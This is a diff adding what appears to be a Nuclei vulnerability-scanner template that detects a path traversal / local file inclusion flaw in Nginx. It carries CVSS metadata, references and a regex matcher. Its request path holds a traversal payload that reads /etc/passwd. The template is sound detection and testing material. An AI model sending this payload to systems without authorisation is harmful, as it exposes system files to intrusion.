@@ -1,0 +1,29 @@
+id: nginx-path-traversal
+info:
+  author: p0ch4t
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  description: Nginx server is vulnerable to local file inclusion.
+  name: Nginx Server - Local File Inclusion
+  reference:
+  - https://github.com/detectify/ugly-duckling/blob/master/modules/crowdsourced/nginx-merge-slashes-path-traversal.json
+  - https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d
+  severity: high
+  tags: exposure,config,lfi,nginx
+requests:
+- matchers:
+  - condition: or
+    part: body
+    regex:
+    - 'root:.*:0:0:'
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/?../../../../../../../etc/passwd'
+  stop-at-first-match: true
